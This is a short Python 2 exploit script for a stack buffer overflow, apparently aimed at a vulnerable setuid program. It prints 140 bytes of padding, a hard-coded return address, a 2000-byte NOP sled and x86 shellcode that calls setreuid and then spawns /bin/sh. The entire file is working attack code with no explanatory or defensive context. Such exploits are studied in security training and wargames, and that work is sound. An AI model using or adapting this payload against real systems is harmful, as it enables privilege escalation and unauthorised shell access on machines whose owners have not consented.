#!/usr/bin/env python2
import struct
shellcode = "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid
shellcode += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" # drop shell

eip = struct.pack("<I", 0xbffff4c0)

print "%s%s%s%s"%("A"*140, eip, "\x90"*2000, shellcode)

